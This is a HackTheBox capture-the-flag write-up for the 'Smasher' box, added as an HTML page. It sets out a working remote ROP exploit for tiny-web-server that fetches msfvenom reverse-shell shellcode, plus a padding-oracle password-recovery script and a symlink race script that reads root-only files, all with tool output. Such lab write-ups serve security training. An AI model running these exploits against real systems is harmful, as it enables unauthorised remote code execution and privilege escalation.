@@ -1,0 +1,627 @@
+<html>
+  <head>
+    <title>HackTheBox - Smasher</title>
+    <style type="text/css">
+      body {
+        background-color: #1E2125;
+        color: #AAAAAA;
+      }
+      
+      hr {
+        border-color: #888888;
+      }
+      
+      a {
+        color: #CCCCCC;
+      }
+      
+      div {
+        background-color: #111111;
+        border: #333333 1px solid;
+      }
+      
+      pre {
+        margin: 0;
+      }
+      
+      mark {
+        background-color: #444444;
+        color: #FFFFFF;
+      }
+    </style>
+  </head>
+  <body>
+    
+    <p><img src="smasher.png" /></p>
+    
+    <p>Written by <b><a target="_blank" href="https://www.hackthebox.eu/home/users/profile/58052">opt1kz</a></b>, 11/23/2018</p>
+    
+    <p><b><i>Smasher</i></b> was a box of moderate-high difficulty which was based around information disclosure and binary exploitation. When all was said and done, an attacker would had to have developed a custom exploit for a remote buffer overflow, performed a padding oracle attack and, finally, exploited a race condition in a SUID binary.</p>
+        
+    <p><h2>Attack Phases</h2></p>
+    
+    <p>
+      <ul>
+        <li><a href="#phase1">Reconnaissance</a></li>
+        <li><a href="#phase2">Exploit Hunting</a></li>
+        <li><a href="#phase3">Exploit Development</a></li>
+        <li><a href="#phase4">Padding Oracle</a></li>
+        <li><a href="#phase5">Race Condition</a></li>
+      </ul>
+    </p>
+    
+    <p><hr /></p>
+    
+    <p><a name="phase1"><h3>Phase 1: Reconnaissance</h3></a></p>
+    
+    <p>Our initial scan revealed ports 22 and 1111; SSH and HTTP, respectively. Browsing to port 1111 revealed a sparse directory listing with a single HTML file masquerading as a login portal. HTTP response headers indicated that the server software was <i>shenfeng tiny-web-server</i>, the source code to which can be found here: <a target="_blank" href="https://github.com/shenfeng/tiny-web-server">https://github.com/shenfeng/tiny-web-server</a>. Standard directory enumeration tools (<b><a target="_blank" href="https://github.com/OJ/gobuster">gobuster</a></b> et al) found nothing. <b><a target="_blank" href="https://cirt.net/Nikto2">Nikto</a></b> reported directory traversal was possible via double forward slashes. Based on this information and the initial presumption that we would be exploiting the web server software, we decided to begin examining the source code.</p>
+    
+    <p>On lines <i>284-288</i> of the <b>parse_request</b> function, requests starting with a forward slash are stripped of that character via incrementation of the string pointer by one byte. If the resulting string is empty, it is set to "." to represent the current directory. Every HTTP request will begin with a forward slash, however, and the software does not check any characters beyond the first.</p>
+    
+    <div><pre><tt>
+  284: if(uri[0] == '/'){
+  285:    filename = uri + 1;
+  286:    int length = strlen(filename);
+  287:    if (length == 0){
+  288:        filename = ".";
+    </tt></pre></div>
+    
+    <p>The modified filename is then assigned to <i>req->filename</i> via the <b>url_decode</b> function (see the next section for details). Later, <i>req->filename</i> is passed directly to <b><a target="_blank" href="http://man7.org/linux/man-pages/man2/openat.2.html">open</a></b> on line <i>352</i> of the <b>process</b> function.</p>
+    
+    <div><pre><tt>
+  352: int status = 200, ffd = open(req.filename, O_RDONLY, 0);
+    </tt></pre></div>
+    
+    <p> This meant that directory traversal wasn't required, as we could just request any file we desired by prepending a forward slash to the URI.</p>
+    
+    <p>For example: <a target="_blank" href="http://10.10.10.89:1111//etc/passwd">http://10.10.10.89:1111//etc/passwd</a>.</p>
+    
+    <p>Using this functionality to examine the filesystem revealed nothing of interest besides <i>/home/www/tiny-web-server</i>, which allowed us to download the server binary for analysis. <i>/home/www/tiny-web-server/tiny.c</i>, <i>/home/www/tiny-web-server/Makefile</i> and <i>/lib/x86_64-linux-gnu/libc.so.6</i> were also downloaded to aid in exploit development.</p>
+    
+    <p><hr /></p>
+    
+    <p><a name="phase2"><h3>Phase 2: Exploit Hunting</h3></a></p>
+    
+    <p>Further examination of the source code revealed a buffer overflow vulnerability.</p>
+    
+    <p>The chain of problematic code begins on line <i>349</i> of the <b>process</b> function, where an <i>http_request</i> structure is passed to the <b>parse_request</b> function:</p>
+    
+    <div><pre><tt>
+  349: parse_request(fd, &req);
+    </tt></pre></div>
+    
+    <p>The <i>http_request</i> structure is defined as follows:</p>
+    
+    <div><pre><tt>
+   32: typedef struct {
+  <mark> 33:   char filename[512]; </mark>
+   34:   off_t offset;              /* for support Range */
+   35:   size_t end;
+   36: } http_request;
+    </tt></pre></div>
+    
+    <p>It is important to note that the size of <i>filename</i> is 512 bytes. On line <i>267</i> of the <b>parse_request</b> function, a buffer for the request URI is allocated on the stack:</p>
+        
+    <div><pre><tt>
+  267: char buf[MAXLINE], method[MAXLINE], uri[MAXLINE];
+    </tt></pre></div>
+    
+    <p>The <i>MAXLINE</i> constant is defined on line <i>19</i>:
+    
+    <div><pre><tt>
+   19: #define MAXLINE 1024   /* max length of a line */
+    </tt></pre></div>
+    
+    <p>On line <i>283</i> of the <b>parse_request</b> function, <i>filename</i> is assigned to the 1024-byte URI buffer. Then the forward slash stripping occurs, followed by <b>url_decode</b> being called on line <i>298</i>:</p>
+    
+    <div><pre><tt>
+  283: char* filename = uri;
+    </div></pre></tt>
+    
+    <br />
+    
+    <div><pre><tt>
+  298: url_decode(filename, req->filename, MAXLINE);
+    </tt></pre></div>
+    
+    <p><b>url_decode</b> decodes URL escape sequences, as expected. The problem lies on line <i>259</i>:</p>
+    
+    <div><pre><tt>
+  250:  void url_decode(char* src, char* dest, int max) {
+  251:      char *p = src;
+  252:      char code[3] = { 0 };
+  253:      while(*p && --max) {
+  254:          if(*p == '%') {
+  255:              memcpy(code, ++p, 2);
+  256:              *dest++ = (char)strtoul(code, NULL, 16);
+  257:              p += 2;
+  258:          } else {
+ <mark> 259:              *dest++ = *p++; </mark>
+  260:          }
+  261:      }
+  262:      *dest = '\0';
+  263:  }
+    </tt></pre></div>
+
+    <p>The 1024-byte <i>src</i> buffer is copied directly to the 512-byte <i>dest</i> buffer with no bounds checking performed,
+    providing us with a remotely exploitable buffer overflow.</p>
+    
+    <p><hr /></p>
+    
+    <p><a name="phase3"><h3>Phase 3: Exploit Development</h3></a></p>
+    
+    <p><b><a target="_blank" href="https://github.com/slimm609/checksec.sh">checksec</a></b> revealed that the server binary was 64-bit, did not have stack canaries, did not support NX, and was not compiled with PIE support. We assumed that ASLR would still be enabled, however, so we needed to bypass that by leaking the address of a function inside libc. We would accomplish this by using <b><a target="_blank" href="https://linux.die.net/man/2/write">write</a></b> to read an address from the Global Offset Table -- the second argument to <b>write</b> is a pointer to a character buffer, allowing us to read from arbitrary memory -- and output that address via our socket's file descriptor.</p>
+    
+    <p>We first needed to determine how many bytes were necessary to overflow the buffer and overwrite the return address. For this we utilized <b><a target="_blank" href="https://www.gnu.org/software/gdb/">GDB</a></b> and <b><a target="_blank" href="https://github.com/longld/peda">PEDA</a></b>. The number of bytes turned out to be 576; 568 bytes to overflow the buffer and overwrite local variables and the saved stack pointer, plus another 8 bytes to overwrite the saved return address.</p>
+    
+    <p>We chose to retrieve the GOT entry for <b><a target="_blank" href="https://linux.die.net/man/2/read">read</a></b> since it was guaranteed to be populated by the time our exploit ran. We used <b><a target="_blank" href="https://linux.die.net/man/1/objdump">objdump</a></b> to find the PLT address of <b>write</b> and the GOT address of <b>read</b>:</p>
+    
+    <div><pre><tt>
+  root@kali:~/smasher# objdump -S tiny | grep write
+  0000000000400c50 &lt;write@plt&gt;:
+   <mark> 400c50:       ff 25 e2 23 20 00    jmpq   *0x2023e2(%rip)        # 603038 &lt;write@GLIBC_2.2.5&gt; </mark>
+  00000000004010c0 &lt;writen&gt;:
+    4010d0:       74 29                je     4010fb &lt;writen+0x3b&gt;
+    4010e9:       e8 62 fb ff ff       callq  400c50 &lt;write@plt&gt;
+    4010f1:       7e 1d                jle    401110 &lt;writen+0x50&gt;
+    4010f9:       75 e5                jne    4010e0 &lt;writen+0x20&gt;
+    401118:       74 c6                je     4010e0 &lt;writen+0x20&gt;
+    4013a9:       e8 12 fd ff ff       callq  4010c0 &lt;writen&gt;
+    401505:       e8 b6 fb ff ff       callq  4010c0 &lt;writen&gt;
+    401592:       e8 29 fb ff ff       callq  4010c0 &lt;writen&gt;
+    401a91:       e8 2a f6 ff ff       callq  4010c0 &lt;writen&gt;
+    401d07:       e8 b4 f3 ff ff       callq  4010c0 &lt;writen&gt;
+  </tt></pre></div>
+    
+    <br />
+    
+    <div><pre><tt>    
+  root@kali:~/smasher# objdump -R tiny | grep read
+ <mark> 0000000000603088 R_X86_64_JUMP_SLOT  read@GLIBC_2.2.5 </mark>
+  00000000006030b0 R_X86_64_JUMP_SLOT  readdir@GLIBC_2.2.5
+    </tt></pre></div>
+    
+    <p>We were also going to require <b><a target="_blank" href="http://man7.org/linux/man-pages/man3/exit.3.html">exit</a></b> in order to prevent the process from crashing after executing our shellcode:</p>
+    
+    <div><pre><tt>
+  root@kali:~/smasher# objdump -S tiny | grep exit
+  0000000000400e10 &lt;exit@plt&gt;:
+   <mark> 400e10:       ff 25 02 23 20 00    jmpq   *0x202302(%rip)        # 603118 &lt;exit@GLIBC_2.2.5&gt; </mark>
+    400f23:       e8 e8 fe ff ff       callq  400e10 &lt;exit@plt&gt;
+    400f51:       e8 ba fe ff ff       callq  400e10 &lt;exit@plt&gt;
+    400f62:       e8 a9 fe ff ff       callq  400e10 &lt;exit@plt&gt;
+    </tt></pre></div>
+    
+    <p>Then, using <b><a target="_blank" href="https://github.com/sashs/Ropper">Ropper</a></b>, we found two of the three necessary gadgets:</p>
+    
+    <div><pre><tt>
+  root@kali:~/smasher# ropper --file tiny --search "pop %rdi; %"
+  [INFO] Load gadgets from cache
+  [LOAD] loading... 100%
+  [LOAD] removing double gadgets... 100%
+  [INFO] Searching for gadgets: pop %rdi; %
+
+  [INFO] File: tiny
+  0x00000000000015af: pop rdi; pop rbp; ret; 
+ <mark> 0x00000000000011dd: pop rdi; ret; </mark>
+    </tt></pre></div>
+    
+    <br />
+    
+    <div><pre><tt>
+  root@kali:~/smasher# ropper --file tiny --search "pop %rsi; %"
+  [INFO] Load gadgets from cache
+  [LOAD] loading... 100%
+  [LOAD] removing double gadgets... 100%
+  [INFO] Searching for gadgets: pop %rsi; %
+
+  [INFO] File: tiny
+  0x00000000000015ad: pop rsi; pop r15; pop rbp; ret; 
+ <mark> 0x00000000000011db: pop rsi; pop r15; ret; </mark>
+    </tt></pre></div>
+    
+    <p>A gadget for populating RDX could not be found, but, luckily, RDX is already set to a large value when our shellcode executes.</p>
+    
+    <p>Finally, we needed <b>read's</b> offset from libc in order to calculate libc's base address:</p>
+    
+    <div><pre><tt>
+  root@kali:~/smasher# readelf -s libc.so.6 | grep __read
+     256: 0000000000117640    58 FUNC    GLOBAL DEFAULT   13 __readlink_chk@@GLIBC_2.4
+     396: 0000000000117590    58 FUNC    GLOBAL DEFAULT   13 __read_chk@@GLIBC_2.4
+    <mark> 538: 00000000000f7250    90 FUNC    WEAK   DEFAULT   13 __read@@GLIBC_2.2.5 </mark>
+    2239: 0000000000117680    16 FUNC    GLOBAL DEFAULT   13 __readlinkat_chk@@GLIBC_2.5
+    </tt></pre></div>
+    
+    <p>From here, we were finally able to recover libc's base address:</p>
+    
+    <div><pre><tt>
+  root@kali:~/smasher# cat leak.py
+  #!/usr/bin/env python
+  import struct
+  import urllib
+  import socket
+
+  exploit = "A" * 568
+  exploit += struct.pack("&lt;Q", 0x4011DD) # Gadget: pop rdi; ret
+  exploit += struct.pack("&lt;Q", 0x000004) # RDI value: socket FD
+  exploit += struct.pack("&lt;Q", 0x4011DB) # Gadget: pop rsi; pop r15; ret
+  exploit += struct.pack("&lt;Q", 0x603088) # RSI value: read() GOT address
+  exploit += struct.pack("&lt;Q", 0x000000) # R15 value: null/junk
+  exploit += struct.pack("&lt;Q", 0x400C50) # write() PLT address
+  exploit += struct.pack("&lt;Q", 0x400E10) # exit() PLT address
+  exploit = urllib.quote_plus(exploit)
+
+  sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+  sock.connect(("10.10.10.89", 1111))
+  sock.send("GET /%s HTTP/1.1\r\n\r\n" % exploit)
+  libc = sock.recv(4096)
+  sock.close()
+
+  libc = libc.split("File not found")[1]
+  libc = struct.unpack("&lt;Q", libc[:8])[0] - 0xF7250
+
+  print "libc: %016X" % libc
+    </tt></pre></div>
+    
+    <br />
+    
+    <div><pre><tt>  
+  root@kali:~/smasher# python exploit.py
+  libc: 00007F1C20B9E000
+    </tt></pre></div>
+    
+    <p>Once we were able to reliably recover libc's base address, we had many more options for our shellcode. libc contains a large number of useful gadgets, such as this one:</p>
+    
+    <div><pre><tt>
+  root@kali:~/smasher# ropper --file libc.so.6 --search "push rsp; ret"
+  [INFO] Load gadgets from cache
+  [LOAD] loading... 100%
+  [LOAD] removing double gadgets... 100%
+  [INFO] Searching for gadgets: push rsp; ret
+
+  [INFO] File: libc.so.6
+  0x0000000000034df8: push rsp; ret 0x2e0f; 
+  0x000000000010a434: push rsp; ret 0x8940; 
+  0x0000000000034aba: push rsp; ret 0xf66; 
+  0x000000000019a10b: push rsp; ret 1; 
+ <mark> 0x0000000000023ad1: push rsp; ret; </mark>
+    </tt></pre></div>
+    
+    <p>With this final gadget allowing us to execute shellcode on the stack, we were able to craft a full-fledged remote exploit:</p>
+    
+    <div><pre><tt>
+  root@kali:~/smasher# cat exploit.py
+  #!/usr/bin/env python
+  import sys
+  import tempfile
+  import subprocess
+  import os
+  import struct
+  import urllib
+  import socket
+
+  pop_rdi   = 0x4011DD # pop rdi; ret
+  pop_rsi   = 0x4011DB # pop rsi; pop r15; ret
+  read_got  = 0x603088 # read() GOT address
+  write_plt = 0x400C50 # write() PLT address
+  read_off  = 0x0F7250 # read() offset from libc base
+  exit_plt  = 0x400E10 # exit() PLT address
+  push_rsp  = 0x023AD1 # push rsp; ret
+
+  def request(addr, port, data):
+      sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+      sock.connect((addr, port))
+      sock.send("GET /%s HTTP/1.1\r\n\r\n" % data)
+      result = sock.recv(4096)
+      sock.close()
+
+      return result
+    
+  def exploit(addr, port):
+      print "[+] Generating shellcode..."
+      
+      temp = tempfile.mktemp()
+      
+      command = "msfvenom -p linux/x64/shell_reverse_tcp LHOST=%s " \
+          "LPORT=%i -f raw -o %s" % (addr, port, temp)
+          
+      print "[-]", command
+          
+      subprocess.Popen(command, shell=True, stdin=subprocess.PIPE,
+          stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()
+          
+      shellcode = open(temp, "rb").read()
+      
+      os.remove(temp)
+
+      exploit = "A" * 568
+      exploit += struct.pack("&lt;Q", pop_rdi)
+      exploit += struct.pack("&lt;Q", 0x4)
+      exploit += struct.pack("&lt;Q", pop_rsi)
+      exploit += struct.pack("&lt;Q", read_got)
+      exploit += struct.pack("&lt;Q", 0x0)
+      exploit += struct.pack("&lt;Q", write_plt)
+      exploit += struct.pack("&lt;Q", exit_plt)
+      exploit = urllib.quote_plus(exploit)
+
+      print "[+] Sending stage 1 ROP chain..."
+
+      data = request("10.10.10.89", 1111, exploit)
+      libc = data.split("File not found")[1]
+      libc = struct.unpack("&lt;Q", libc[:8])[0] - read_off
+
+      print "[-] libc base address: 0x%08X" % libc
+      print "[+] Sending stage 2 shellcode..."
+
+      exploit = "A" * 568
+      exploit += struct.pack("&lt;Q", libc + push_rsp)
+      exploit += shellcode
+      exploit += struct.pack("&lt;Q", exit_plt)
+      exploit = urllib.quote_plus(exploit)
+
+      request("10.10.10.89", 1111, exploit)
+
+      print "[*] Done! Check your listener!"
+
+  def usage():
+      print "Usage: %s &lt;addr&gt; &lt;port&gt;" % sys.argv[0]
+      sys.exit()
+    
+  def main():
+      if len(sys.argv) &lt; 3:
+          usage()
+         
+      addr = sys.argv[1]
+      port = int(sys.argv[2])
+         
+      exploit(addr, port)
+    
+  if __name__ == "__main__":
+      main()
+    </tt></pre></div>
+    
+    <p>Source: <b><a target="_blank" href="https://github.com/opt1kz/hackthebox/blob/master/smasher/exploit.py">https://github.com/opt1kz/hackthebox/blob/master/smasher/exploit.py</a></b></p>
+    
+    <div><pre><tt>
+  root@kali:~/smasher# python exploit.py 10.10.XX.XX 1337
+  [+] Generating shellcode...
+  [-] msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.XX.XX LPORT=1337 -f raw -o /tmp/tmpT4TUiu
+  [+] Sending stage 1 ROP chain...
+  [-] libc base address: 0x7F9302952000
+  [+] Sending stage 2 shellcode...
+  [*] Done! Check your listener!
+      </tt></pre></div>
+    
+    <p>From our listener, already running in another console:</p>
+    
+    <div><pre><tt>
+    root@kali:~/smasher# nc -vvlp 1337
+    listening on [any] 1337 ...
+    10.10.10.89: inverse host lookup failed: Unknown host
+    connect to [10.10.XX.XX] from (UNKNOWN) [10.10.10.89] 50722
+    id
+    uid=1000(www) gid=1000(www) groups=1000(www)
+    </tt></pre></div>
+    
+    <p><hr /></p>
+    
+    <p><a name="phase4"><h3>Phase 4: Padding Oracle</h3></a></p>
+    
+    <p>During the process of enumerating the system, we stumbled upon a service bound to 127.0.0.1:</p>
+    
+    <div><pre><tt>
+  $ ps aux | grep smasher
+  root       653  0.0  0.3  54816  3896 ?        S    03:59   0:00 sudo -u smasher /home/smasher/socat.sh
+  smasher    690  0.0  0.2  12512  2984 ?        S    03:59   0:00 bash /home/smasher/socat.sh
+ <mark> smasher    693  0.0  0.1  24364  1704 ?        S    03:59   0:00 socat TCP-LISTEN:1337,reuseaddr,fork,bind=127.0.0.1 EXEC:/usr/bin/python /home/smasher/crackme.py </mark>
+  www       2084  0.0  0.0  11284   972 pts/0    S+   06:15   0:00 grep smasher
+    </tt></pre></div>
+    
+    <p>We used <b><a target="_blank" href="https://linux.die.net/man/1/socat">socat</a></b> to enable us to connect to this service remotely, for ease of testing and development:</p>
+    
+    <div><pre><tt>
+  $ socat TCP-LISTEN:1338,reuseaddr,fork TCP:127.0.0.1:1337 &
+    </tt></pre></div>
+    
+    <br />
+    
+    <div><pre><tt>
+  root@kali:~/smasher# telnet 10.10.10.89 1338
+  Trying 10.10.10.89...
+  Connected to 10.10.10.89.
+  Escape character is '^]'.
+  [*] Welcome to AES Checker! (type 'exit' to quit)
+  [!] Crack this one: irRmWB7oJSMbtBC4QuoB13DC08NI06MbcWEOc94q0OXPbfgRm+l9xHkPQ7r7NdFjo6hSo6togqLYITGGpPsXdg==
+  Insert ciphertext: irRmWB7oJSMbtBC4QuoB13DC08NI06MbcWEOc94q0OXPbfgRm+l9xHkPQ7r7NdFjo6hSo6togqLYITGGpPsXdg==
+  Hash is OK!
+  Insert ciphertext: irRmWB7oJSMbtBC4QuoB13DC08NI06MbcWEOc94q0OXPbfgRm+l9xHkPQ7r7NdFjo6hSo6togqLYITGGpPsXdg=         
+  Generic error, ignore me!
+  Insert ciphertext: irRmWB7oJSMbtBC4QuoB13DC08NI06MbcWEOc94q0OXPbfgRm+l9xHkPQ7r7NdFjo6hSo6togqLYITGGpPsXdG==
+  Invalid Padding!
+    </tt></pre></div>
+    
+    <p>This would obviously require a padding oracle attack. Thanks to the <i>phenomenal</i> <b><a target="_blank" href="https://github.com/nccgroup/featherduster">Featherduster</a></b> library, the process was painless:</p>
+    
+    <div><pre><tt>
+  root@kali:~/smasher# cat crack.py
+  #!/usr/bin/env python
+  import sys
+  import socket
+  import time
+  import base64
+  import cryptanalib
+
+  def get_response(sock):
+      resp = ""
+
+      while "ciphertext" not in resp:
+        resp += sock.recv(4096)
+        time.sleep(0.01)
+        
+      return resp
+
+  def request(data):
+      sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+      sock.connect((sys.argv[1], int(sys.argv[2])))
+
+      resp = get_response(sock)
+      data = base64.b64encode(data)    
+      sock.send(data + "\r\n")
+      resp = get_response(sock)
+      sock.close()
+
+      return ("OK!" in resp)
+
+  def crack():
+      data = base64.b64decode(
+        "irRmWB7oJSMbtBC4QuoB13DC08NI06MbcWEOc94q0OXP" \
+        "bfgRm+l9xHkPQ7r7NdFjo6hSo6togqLYITGGpPsXdg=="
+      )
+
+      cryptanalib.padding_oracle_decrypt(request, data, 16, verbose=True)
+      
+  def usage():
+      print "Usage: %s &lt;host&gt; &lt;port&gt;" % sys.argv[0]
+      sys.exit()
+      
+  def main():
+      if len(sys.argv) &lt; 3:
+          usage()
+          
+      crack()
+    
+  if __name__ == "__main__":
+      main()
+    </tt></pre></div>
+    
+    <p>Source: <b><a target="_blank" href="https://github.com/opt1kz/hackthebox/blob/master/smasher/crack.py">https://github.com/opt1kz/hackthebox/blob/master/smasher/crack.py</a></b></p>
+    
+    <div><pre><tt>
+  root@kali:~/smasher# python crack.py 10.10.10.89 1338
+  [*] No IV was provided, using a block of null bytes instead. Unless a block of null bytes is being used as the IV, expect the first block to be garbled.
+
+  Decrypting block 1 of 4
+  [+] Decrypted block: SSH password for
+  Decrypting block 2 of 4
+  [+] Decrypted block:  user 'smasher' 
+  Decrypting block 3 of 4
+  [+] Decrypted block: is: Featherduste
+  Decrypting block 4 of 4
+  [+] Decrypted block: rIsCool123
+    </tt></pre></div>
+    
+    <p>Thus the decrypted message read: <i>SSH password for user 'smasher' is FeatherdusterIsCool123</i>.</p>
+    
+    <p><hr /></p>
+    
+    <p><a name="phase5"><h3>Phase 5: Race Condition</h3></a></p>
+    
+    <p>After connecting via SSH and reviewing (as well as continuing) our enumeration, we found an SUID binary in /usr/bin named <i>checker</i>.</p>
+    
+    <div><pre><tt>
+  smasher@smasher:~$ /usr/bin/checker /root/root.txt
+  [+] Welcome to file UID checker 0.1 by dzonerzy
+
+  Acess failed , you don't have permission!
+    </tt></pre></div>
+    
+    <br />
+    
+    <div><pre><tt>
+  smasher@smasher:~$ /usr/bin/checker /home/smasher/user.txt
+  [+] Welcome to file UID checker 0.1 by dzonerzy
+
+  File UID: 0
+
+  Data:
+  ee11cbb19052e40b07aac0ca060c23ee
+    </tt></pre></div>
+    
+    <p>We then downloaded this binary for analysis. It is essentially just one big <b>main</b> function, with a <b>ReadFile</b> helper function that does as you would expect. After decompiling <b>main</b>, we discovered an exploitable race condition, which occurs as the result of interactions between iines <i>25</i>, <i>33</i> and <i>34</i>:</p>
+    
+    <div><pre><tt>
+ <mark> 25: else if ( access(name, 4) ) </mark>
+  26: {
+  27:   puts("Acess failed , you don't have permission!");
+  28: }
+  29: else
+  30: {
+  31:   setuid(0);
+  32:   setgid(0);
+ <mark> 33:   sleep(1u); </mark>
+ <mark> 34:   LODWORD(v4) = ReadFile(name, 4LL); </mark>
+  35:   src = v4;
+  36:   strcpy(&amp;dest, v4);
+  37:   printf("File UID: %d\n", stat_buf->st_uid, argv);
+  38:   printf("\nData:\n%s", &amp;dest);
+  39: }
+    </tt></pre></div>
+    
+    <p>Exploiting this condition was simple. We provided the program with the path to a symbolic link which points to a file we had read access to, followed by swapping said symbolic link's target during the one second <b><a target="_blank" href="http://man7.org/linux/man-pages/man3/sleep.3.html">sleep</a></b> call. This effectively bypassed the protections afforded by the <b><a target="_blank" href="https://linux.die.net/man/2/access">access</a></b> call on line <i>25</i>, allowing us to read arbitrary files.</p>
+    
+    <div><pre><tt>
+  smasher@smasher:~$ cat race.py
+  #!/usr/bin/env python
+  import sys
+  import os
+  import time
+
+  def usage():
+      print "Usage: %s <target_file>" % sys.argv[0]
+      sys.exit()
+
+  def main():
+      if len(sys.argv) &lt; 2:
+        usage()
+
+      if os.path.exists("output.txt"):
+          os.system("rm output.txt")
+              
+      if os.path.exists("input.txt"):
+          os.system("unlink input.txt")
+      
+      os.system("ln -s /home/smasher/user.txt input.txt")
+      os.system("checker input.txt &gt; output.txt &amp;")
+      os.system("unlink input.txt")
+      os.system("ln -s %s input.txt" % sys.argv[1])
+
+      time.sleep(1.0)
+
+      os.system("cat output.txt")
+
+  if __name__ == "__main__":
+      main()
+    </tt></pre></div>
+    
+    <p>Source: <b><a target="_blank" href="https://github.com/opt1kz/hackthebox/blob/master/smasher/race.py">https://github.com/opt1kz/hackthebox/blob/master/smasher/race.py</a></b></p>
+    
+    <div><pre><tt>
+  smasher@smasher:~$ python race.py /root/root.txt
+  [+] Welcome to file UID checker 0.1 by dzonerzy
+
+  File UID: 0
+
+  Data:
+  63a9f0ea7bb98050796b649e85481845
+    </tt></pre></div>
+    
+    <p><hr /></p>
+    
+    <p><h3>Closing Remarks</h3></p>
+    
+    <p>And there you have it, folks. Hopefully this was informative and you learned something from it. Please note that the SSH password and user/root flags have been altered in order to avoid handing out freebies. All of the offsets and scripts presented here are completely valid and functional as-is, however, so feel free to use them.</p>
+    
+    <p>Any questions, comments or concerns you may have can be directed to any of the following:</p>
+    
+    <b>Discord</b>: opt1kz#2491
+    <br /><b>HTB (Forums)</b>: <a target="_blank" href="https://forum.hackthebox.eu/profile/opt1kz">https://forum.hackthebox.eu/profile/opt1kz</a>
+    <br /><b>HTB (Website)</b>: <a target="_blank" href="https://www.hackthebox.eu/home/users/profile/58052">https://www.hackthebox.eu/home/users/profile/58052</a>
+    <br /><b>NetSec Focus</b>: <a target="_blank" href="https://chat.netsecfocus.com/nsf/messages/@opt1kz">https://chat.netsecfocus.com/nsf/messages/@opt1kz</a>
+    <br /><b>Email</b>: <a target="_blank" href="mailto:opt1kz@protonmail.com">opt1kz@protonmail.com</a>
+    <br /><b>Twitter</b>: <a target="_blank" href="http://twitter.com/opt1kz_sec">http://twitter.com/opt1kz_sec</a>
+    
+    <br />
+    <br />
+    
+  </body>
+</html>
